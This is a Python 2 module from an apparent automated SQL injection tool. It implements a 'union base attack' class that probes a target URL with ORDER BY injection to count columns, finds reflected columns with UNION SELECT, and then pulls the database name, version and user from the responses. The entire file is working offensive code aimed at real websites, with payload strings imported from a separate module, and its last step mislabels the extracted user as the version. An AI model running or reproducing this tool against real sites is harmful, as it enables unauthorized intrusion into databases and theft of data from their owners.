#this file created for union base attck method

try:
    import src.libs as lib
    from src.Colors import TextColor
    from injection_defines import (
        define_order_by_command_php, 
        define_error_order_by_php,
        define_union_select_query_php,
        define_database_detection_query_php,
        define_version_detection_query_php,
        define_user_detection_query_php
    )

    from Config.WebConfig import (define_headerdata)
except Exception as err:
    raise SystemExit, TextColor.RED + TextColor.BOLD + str("What happened :( something is wrong: %s" % (err)) \
                      + TextColor.WHITE

class UnionBaseAttack(object):
    def __init__(self, url, injectedChar, firstResponse):
        self.url = url
        self.injectedChar = injectedChar
        self.firstResponse = firstResponse

        self.__StartAttack__()

    def __StartAttack__(self):
        injected_method = ""

        for item in define_order_by_command_php:
            secondResponse = lib.requests.get(url=self.url + str(item), headers=define_headerdata)
            lib.sleep(.5)
            if secondResponse.content.find(define_error_order_by_php[0]) is not -1:
                injected_method = item[0:10]
                print TextColor.CVIOLET + str("\nI working on order by injection please wait until I found they columns") + TextColor.WHITE
                columns = self.__InjectOrderNumber__(injected_method)
                done_str = self.url + injected_method + str(columns)
                print TextColor.CBEIGE + str("[+] Found => %d columns {%s}"%(columns, done_str)) + TextColor.WHITE
                print TextColor.CVIOLET + str("\nNow I testing the union select query ...") + TextColor.WHITE
                self.__UnionSelectQuery__(columns)
                del (columns)
                del (injected_method)
                break

    def __InjectOrderNumber__ (self, injectedMethod):
        '''return count of columns that website has'''
        for counter in xrange(1, 1000):
            lib.sleep(1)
            secondResponse = lib.requests.get(url=self.url + injectedMethod + str(counter))
            if secondResponse.content != self.firstResponse.content:
                return counter - 1

    def __UnionSelectQuery__(self, columns):
        list_my_injection_numbers = list()
        for number in xrange(1, columns + 1):
            list_my_injection_numbers.append(str(number) * 10)
        
        injection_string = ""

        for counter in list_my_injection_numbers:
            injection_string = injection_string + str(counter) + ","

        injection_string = injection_string[0:len(injection_string) - 1]

        id_number = lib.re.findall('\d', self.url)
        new_url = lib.string.replace(self.url, id_number[0], '-' + id_number[0])

        vuln_columns = list()
        done_searching_columns = False
        success_InjectedString = ""
        raw_vuln_columns = list()
        
        '''this below code test url with (-) in and forward of number in url'''
        for item in define_union_select_query_php:    
            response = lib.requests.get(url=new_url + str(item + injection_string), headers=define_headerdata)
            for numbers in list_my_injection_numbers:
                if response.content.find(numbers) is not -1:
                    vuln_columns.append(numbers[0:1])
                    raw_vuln_columns.append(numbers)
                    done_searching_columns = True
            lib.sleep(0.5)
            if done_searching_columns == True:
                success_InjectedString = new_url + str(item + injection_string)
                break
        
        '''this below code test raw url with no (-) in url'''
        if done_searching_columns == False:
            for item in define_union_select_query_php:    
                response = lib.requests.get(url=self.url + str(item + injection_string), headers=define_headerdata)
                for numbers in list_my_injection_numbers:
                    if response.content.find(numbers) is not -1:
                        vuln_columns.append(numbers[0:1])
                        raw_vuln_columns.append(numbers)
                        done_searching_columns = True
                lib.sleep(0.5)
                if done_searching_columns == True:
                    success_InjectedString = new_url + str(item + injection_string)
                    break

        print TextColor.CYELLOWBG + TextColor.RED + "[+] Found Vulnaraable columns number " + TextColor.WHITE
        
        str_vulns_columns = ""
        for item in vuln_columns:
            str_vulns_columns = str_vulns_columns + item + " "
        str_vulns_columns = str_vulns_columns[0:len(str_vulns_columns) - 1]        

        lib.sys.stdout.write("Vulnarable Columns =>\n\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n\t\t|" + str_vulns_columns)
        lib.sys.stdout.write("|\n\t\t" + ("-" * (len(str_vulns_columns) + 2)) + "\n")

        self.__ExtractData__(raw_vuln_columns, success_InjectedString)

        del(list_my_injection_numbers)
        del(raw_vuln_columns)
        del(success_InjectedString)

    def __ExtractData__(self, vuln_columns, success_InjectedString):
        '''
            this function work on data in database and extract them with sql query injection
        '''
        database_name = ""
        version_name = ""

        #1. extarct the database name
        for item in define_database_detection_query_php:
            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
            if response.content.find("FINDDATABASE=>{ ") is not -1:
                end = lib.re.search("FINDDATABASE=>{", response.content).end()
                starts = lib.re.search("}<=FINDDATABASE", response.content).start()
                print TextColor.CBEIGE2 + str("[+]Database is => ") + response.content[end:starts] + TextColor.WHITE
                database_name = response.content[end:starts]
                break
            lib.sleep(.5)
        
        lib.sleep(.5)

        #2. extract the version of database
        for item in define_version_detection_query_php:
            response = response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
            if response.content.find("FINDVERSION=>{ ") is not -1:
                end = lib.re.search("FINDVERSION=>{", response.content).end()
                start = lib.re.search("}<=FINDVERSION", response.content).start()
                print TextColor.CBEIGE2 + str("[+]Version of database is => ") + response.content[end:start] + TextColor.WHITE
                version_name = response.content[end:start]
                break
            lib.sleep(.5)
        
        lib.sleep(.5)
        
        #3. extract the user of database
        for item in define_user_detection_query_php:
            response = response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
            if response.content.find("FINDUSER=>{ ") is not -1:
                end = lib.re.search("FINDUSER=>{", response.content).end()
                start = lib.re.search("}<=FINDUSER", response.content).start()
                print TextColor.CBEIGE2 + str("[+]Version of database is => ") + response.content[end:start] + TextColor.WHITE
                version_name = response.content[end:start]
                break
